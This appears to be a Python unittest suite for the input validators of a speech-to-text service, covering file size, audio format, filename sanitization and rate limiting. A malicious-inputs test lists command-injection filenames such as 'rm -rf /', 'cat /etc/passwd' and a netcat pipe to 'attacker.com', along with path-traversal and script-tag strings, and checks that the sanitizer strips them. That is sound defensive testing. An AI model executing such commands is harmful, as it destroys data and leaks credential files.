#!/usr/bin/env python3
"""
Comprehensive security tests for the Unified STT Service
"""
import os
import sys
import time
import json
import asyncio
import unittest
import tempfile
import random
import string
from unittest.mock import patch, MagicMock
from io import BytesIO

# Add the stts module to the path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from stts.validators import (
    validate_file_size,
    validate_mime_type,
    validate_magic_number,
    sanitize_filename,
    validate_audio_file,
    sanitize_ffmpeg_input,
    RateLimiter,
    SecurityMiddleware,
    MAX_FILE_SIZE,
    MAX_REQUESTS_PER_MINUTE,
    MAX_REQUESTS_PER_HOUR,
    AUDIO_MAGIC_NUMBERS
)


class TestFileSizeValidation(unittest.TestCase):
    """Test file size validation"""
    
    def test_empty_file(self):
        """Test that empty files are rejected"""
        is_valid, error = validate_file_size(b'')
        self.assertFalse(is_valid)
        self.assertIn("empty", error.lower())
    
    def test_normal_file(self):
        """Test that normal sized files are accepted"""
        # 1MB file
        data = b'x' * (1024 * 1024)
        is_valid, error = validate_file_size(data)
        self.assertTrue(is_valid)
        self.assertIsNone(error)
    
    def test_oversized_file(self):
        """Test that oversized files are rejected"""
        # Create data larger than MAX_FILE_SIZE
        data = b'x' * (MAX_FILE_SIZE + 1)
        is_valid, error = validate_file_size(data)
        self.assertFalse(is_valid)
        self.assertIn("exceeds", error.lower())
    
    def test_edge_case_max_size(self):
        """Test file exactly at max size"""
        data = b'x' * MAX_FILE_SIZE
        is_valid, error = validate_file_size(data)
        self.assertTrue(is_valid)
        self.assertIsNone(error)


class TestMimeTypeValidation(unittest.TestCase):
    """Test MIME type and magic number validation"""
    
    def test_valid_wav_file(self):
        """Test valid WAV file magic number"""
        # WAV file starts with RIFF
        wav_header = b'RIFF' + b'\x00' * 100
        is_valid, error = validate_mime_type(wav_header, content_type='audio/wav')
        self.assertTrue(is_valid)
        self.assertIsNone(error)
    
    def test_valid_mp3_file(self):
        """Test valid MP3 file magic number"""
        # MP3 with ID3 tag
        mp3_header = b'ID3' + b'\x00' * 100
        is_valid, error = validate_mime_type(mp3_header, content_type='audio/mp3')
        self.assertTrue(is_valid)
        self.assertIsNone(error)
    
    def test_valid_flac_file(self):
        """Test valid FLAC file magic number"""
        flac_header = b'fLaC' + b'\x00' * 100
        is_valid, error = validate_mime_type(flac_header, content_type='audio/flac')
        self.assertTrue(is_valid)
        self.assertIsNone(error)
    
    def test_invalid_mime_type(self):
        """Test invalid MIME type is rejected"""
        data = b'RIFF' + b'\x00' * 100
        is_valid, error = validate_mime_type(data, content_type='text/plain')
        self.assertFalse(is_valid)
        self.assertIn("invalid mime type", error.lower())
    
    def test_invalid_magic_number(self):
        """Test file with invalid magic number"""
        # Random bytes that don't match any audio format
        data = b'\x89PNG\r\n\x1a\n' + b'\x00' * 100  # PNG header
        is_valid = validate_magic_number(data)
        self.assertFalse(is_valid)  # Should now fail since we don't allow unknown formats
    
    def test_mp4_ftyp_box(self):
        """Test MP4/M4A file with ftyp box"""
        # MP4 has 'ftyp' at offset 4
        mp4_header = b'\x00\x00\x00\x20ftyp' + b'\x00' * 100
        is_valid = validate_magic_number(mp4_header)
        self.assertTrue(is_valid)
    
    def test_short_file(self):
        """Test very short file"""
        data = b'AB'  # Only 2 bytes
        is_valid = validate_magic_number(data)
        self.assertFalse(is_valid)


class TestFilenameSanitization(unittest.TestCase):
    """Test filename sanitization"""
    
    def test_path_traversal_attack(self):
        """Test path traversal attack prevention"""
        malicious = "../../../etc/passwd"
        sanitized = sanitize_filename(malicious)
        self.assertNotIn("..", sanitized)
        self.assertNotIn("/", sanitized)
        # os.path.basename("../../../etc/passwd") returns "passwd"
        self.assertEqual(sanitized, "passwd")
    
    def test_null_byte_injection(self):
        """Test null byte injection prevention"""
        malicious = "file.mp3\x00.exe"
        sanitized = sanitize_filename(malicious)
        self.assertNotIn("\x00", sanitized)
        self.assertEqual(sanitized, "file.mp3.exe")
    
    def test_special_characters(self):
        """Test removal of special characters"""
        filename = "file<>:\"|?*.mp3"
        sanitized = sanitize_filename(filename)
        for char in '<>:"|?*':
            self.assertNotIn(char, sanitized)
    
    def test_long_filename(self):
        """Test filename length limiting"""
        long_name = "a" * 300 + ".mp3"
        sanitized = sanitize_filename(long_name)
        self.assertLessEqual(len(sanitized), 255)
        self.assertTrue(sanitized.endswith(".mp3"))
    
    def test_empty_filename(self):
        """Test empty filename handling"""
        sanitized = sanitize_filename("")
        self.assertEqual(sanitized, "unnamed_file")
    
    def test_normal_filename(self):
        """Test normal filename passes through"""
        normal = "audio_file_123.wav"
        sanitized = sanitize_filename(normal)
        self.assertEqual(sanitized, normal)


class TestRateLimiting(unittest.TestCase):
    """Test rate limiting functionality"""
    
    def setUp(self):
        self.rate_limiter = RateLimiter()
        self.rate_limiter.reset()  # Clear any existing state
    
    def test_normal_requests(self):
        """Test normal request rate is allowed"""
        client_id = "192.168.1.1"
        
        # Make 10 requests
        for i in range(10):
            allowed, error = self.rate_limiter.is_allowed(client_id)
            self.assertTrue(allowed)
            self.assertIsNone(error)
    
    def test_minute_rate_limit(self):
        """Test per-minute rate limiting"""
        client_id = "192.168.1.2"
        
        # Make requests up to the limit
        for i in range(MAX_REQUESTS_PER_MINUTE):
            allowed, error = self.rate_limiter.is_allowed(client_id)
            self.assertTrue(allowed)
        
        # Next request should be blocked
        allowed, error = self.rate_limiter.is_allowed(client_id)
        self.assertFalse(allowed)
        self.assertIn("per minute", error)
    
    def test_hour_rate_limit(self):
        """Test per-hour rate limiting"""
        # This test simulates hitting the hour limit
        client_id = "192.168.1.3"
        
        # We'll manually populate the rate limiter's request history
        # to simulate many requests spread over time
        with self.rate_limiter.lock:
            now = time.time()
            # Add requests spread over the last 50 minutes
            # This way we don't hit the minute limit but can hit the hour limit
            requests = []
            for i in range(MAX_REQUESTS_PER_HOUR):
                # Spread requests over 50 minutes
                timestamp = now - (i * 3)  # 3 seconds apart
                requests.append(timestamp)
            self.rate_limiter.requests[client_id] = requests
        
        # Now try one more request - should hit hour limit
        allowed, error = self.rate_limiter.is_allowed(client_id)
        self.assertFalse(allowed)
        self.assertIn("hour", error.lower())
    
    def test_multiple_clients(self):
        """Test rate limiting is per-client"""
        client1 = "192.168.1.4"
        client2 = "192.168.1.5"
        
        # Fill up client1's quota
        for i in range(MAX_REQUESTS_PER_MINUTE):
            self.rate_limiter.is_allowed(client1)
        
        # Client1 should be blocked
        allowed1, error1 = self.rate_limiter.is_allowed(client1)
        self.assertFalse(allowed1)
        
        # Client2 should still be allowed
        allowed2, error2 = self.rate_limiter.is_allowed(client2)
        self.assertTrue(allowed2)
    
    def test_reset_client(self):
        """Test resetting rate limit for specific client"""
        client_id = "192.168.1.6"
        
        # Fill up quota
        for i in range(MAX_REQUESTS_PER_MINUTE):
            self.rate_limiter.is_allowed(client_id)
        
        # Should be blocked
        allowed, _ = self.rate_limiter.is_allowed(client_id)
        self.assertFalse(allowed)
        
        # Reset this client
        self.rate_limiter.reset(client_id)
        
        # Should be allowed again
        allowed, _ = self.rate_limiter.is_allowed(client_id)
        self.assertTrue(allowed)


class TestFFmpegSanitization(unittest.TestCase):
    """Test FFmpeg input sanitization"""
    
    def test_valid_audio_bytes(self):
        """Test valid audio bytes pass through"""
        audio = b'RIFF' + b'\x00' * 1000
        sanitized = sanitize_ffmpeg_input(audio)
        self.assertEqual(sanitized, audio)
    
    def test_non_bytes_input(self):
        """Test non-bytes input is rejected"""
        with self.assertRaises(ValueError) as ctx:
            sanitize_ffmpeg_input("not bytes")
        self.assertIn("must be bytes", str(ctx.exception))
    
    def test_oversized_input(self):
        """Test oversized input is rejected"""
        oversized = b'x' * (MAX_FILE_SIZE + 1)
        with self.assertRaises(ValueError) as ctx:
            sanitize_ffmpeg_input(oversized)
        self.assertIn("exceeds maximum size", str(ctx.exception))


class TestSecurityMiddleware(unittest.TestCase):
    """Test security middleware"""
    
    def test_get_client_id_forwarded(self):
        """Test client ID extraction from X-Forwarded-For"""
        request = MagicMock()
        request.headers = {'X-Forwarded-For': '10.0.0.1, 192.168.1.1'}
        request.ip = '127.0.0.1'
        
        client_id = SecurityMiddleware.get_client_id(request)
        self.assertEqual(client_id, '10.0.0.1')
    
    def test_get_client_id_real_ip(self):
        """Test client ID extraction from X-Real-IP"""
        request = MagicMock()
        request.headers = {'X-Real-IP': '10.0.0.2'}
        request.ip = '127.0.0.1'
        
        client_id = SecurityMiddleware.get_client_id(request)
        self.assertEqual(client_id, '10.0.0.2')
    
    def test_get_client_id_direct(self):
        """Test client ID from direct connection"""
        request = MagicMock()
        request.headers = {}
        request.ip = '192.168.1.100'
        
        client_id = SecurityMiddleware.get_client_id(request)
        self.assertEqual(client_id, '192.168.1.100')


class TestComprehensiveValidation(unittest.TestCase):
    """Test comprehensive audio file validation"""
    
    def test_valid_audio_file(self):
        """Test valid audio file passes all checks"""
        # Create a valid WAV header
        wav_data = b'RIFF' + b'\x00' * 1000
        
        is_valid, error, metadata = validate_audio_file(
            wav_data,
            filename="test.wav",
            content_type="audio/wav",
            client_id="192.168.1.1"
        )
        
        self.assertTrue(is_valid)
        self.assertIsNone(error)
        self.assertIsNotNone(metadata)
        self.assertEqual(metadata['size'], len(wav_data))
        self.assertIn('hash', metadata)
        self.assertEqual(metadata['sanitized_filename'], 'test.wav')
    
    def test_malicious_file_rejected(self):
        """Test malicious file is rejected"""
        # Oversized file
        malicious = b'x' * (MAX_FILE_SIZE + 1)
        
        is_valid, error, metadata = validate_audio_file(
            malicious,
            filename="evil.wav",
            content_type="audio/wav",
            client_id="192.168.1.1"
        )
        
        self.assertFalse(is_valid)
        self.assertIn("exceeds", error.lower())
        self.assertIsNone(metadata)
    
    def test_rate_limited_request(self):
        """Test rate limited request is rejected"""
        wav_data = b'RIFF' + b'\x00' * 1000
        client_id = "192.168.1.99"
        
        # Reset to ensure clean state
        from stts.validators import rate_limiter
        rate_limiter.reset(client_id)
        
        # Fill up the rate limit
        for i in range(MAX_REQUESTS_PER_MINUTE):
            validate_audio_file(wav_data, client_id=client_id)
        
        # Next request should be rate limited
        is_valid, error, metadata = validate_audio_file(
            wav_data,
            client_id=client_id
        )
        
        self.assertFalse(is_valid)
        self.assertIn("rate limit", error.lower())


class TestMaliciousInputs(unittest.TestCase):
    """Test handling of various malicious inputs"""
    
    def test_command_injection_filename(self):
        """Test command injection via filename"""
        malicious_names = [
            "audio.wav; rm -rf /",
            "audio.wav && cat /etc/passwd",
            "audio.wav | nc attacker.com 1337",
            "audio$(whoami).wav",
            "audio`id`.wav",
        ]
        
        for name in malicious_names:
            sanitized = sanitize_filename(name)
            # Check dangerous characters are removed
            self.assertNotIn(";", sanitized)
            self.assertNotIn("&", sanitized)
            self.assertNotIn("|", sanitized)
            self.assertNotIn("$", sanitized)
            self.assertNotIn("`", sanitized)
            self.assertNotIn("(", sanitized)
            self.assertNotIn(")", sanitized)
    
    def test_xml_bomb(self):
        """Test XML bomb type attack (large expansion)"""
        # Create a file that could expand significantly
        compressed = b'x' * 1000
        
        # This should pass initial validation
        is_valid, error = validate_file_size(compressed)
        self.assertTrue(is_valid)
        
        # The base_engine should catch expansion in normalize_audio
        # This is tested implicitly by the size checks in base_engine.py
    
    def test_polyglot_file(self):
        """Test polyglot file (valid magic number but malicious content)"""
        # File that starts with valid WAV header but contains other data
        polyglot = b'RIFF' + b'\x00\x00\x00\x00WAVEfmt ' + b'<script>alert(1)</script>' * 100
        
        # Should detect as audio based on magic number
        is_valid = validate_magic_number(polyglot)
        self.assertTrue(is_valid)
        
        # The actual audio processing would fail, but initial validation passes
        # This is why we sanitize in FFmpeg processing too
    
    def test_race_condition_file_size(self):
        """Test potential race condition with file size checking"""
        # Start with small file
        initial = b'RIFF' + b'\x00' * 100
        
        # Validate initially
        is_valid1, _ = validate_file_size(initial)
        self.assertTrue(is_valid1)
        
        # Even if file changes between checks, each check is atomic
        # and operates on the bytes provided at that moment
        large = b'x' * (MAX_FILE_SIZE + 1)
        is_valid2, _ = validate_file_size(large)
        self.assertFalse(is_valid2)


class TestPerformance(unittest.TestCase):
    """Test performance under load"""
    
    def test_rapid_requests(self):
        """Test handling rapid requests"""
        rate_limiter = RateLimiter()
        client_id = "perf_test_1"
        
        start_time = time.time()
        request_count = 0
        
        # Simulate rapid requests for 1 second
        while time.time() - start_time < 1.0:
            allowed, _ = rate_limiter.is_allowed(client_id)
            if allowed:
                request_count += 1
            time.sleep(0.001)  # 1ms between requests
        
        # Should have processed some requests but respected rate limit
        self.assertGreater(request_count, 0)
        self.assertLessEqual(request_count, MAX_REQUESTS_PER_MINUTE)
    
    def test_concurrent_validation(self):
        """Test concurrent file validation"""
        import threading
        
        wav_data = b'RIFF' + b'\x00' * 1000
        results = []
        
        def validate_worker(client_num):
            client_id = f"concurrent_{client_num}"
            is_valid, error, metadata = validate_audio_file(
                wav_data,
                client_id=client_id
            )
            results.append((is_valid, error))
        
        # Create multiple threads
        threads = []
        for i in range(10):
            t = threading.Thread(target=validate_worker, args=(i,))
            threads.append(t)
            t.start()
        
        # Wait for all threads
        for t in threads:
            t.join()
        
        # All should succeed (different client IDs)
        for is_valid, error in results:
            self.assertTrue(is_valid)
            self.assertIsNone(error)


def run_security_tests():
    """Run all security tests"""
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add all test classes
    test_classes = [
        TestFileSizeValidation,
        TestMimeTypeValidation,
        TestFilenameSanitization,
        TestRateLimiting,
        TestFFmpegSanitization,
        TestSecurityMiddleware,
        TestComprehensiveValidation,
        TestMaliciousInputs,
        TestPerformance,
    ]
    
    for test_class in test_classes:
        suite.addTests(loader.loadTestsFromTestCase(test_class))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "="*70)
    print("SECURITY TEST SUMMARY")
    print("="*70)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped)}")
    
    if result.wasSuccessful():
        print("\n✅ All security tests passed!")
    else:
        print("\n❌ Some tests failed. Please review the output above.")
    
    return result.wasSuccessful()


if __name__ == '__main__':
    success = run_security_tests()
    sys.exit(0 if success else 1)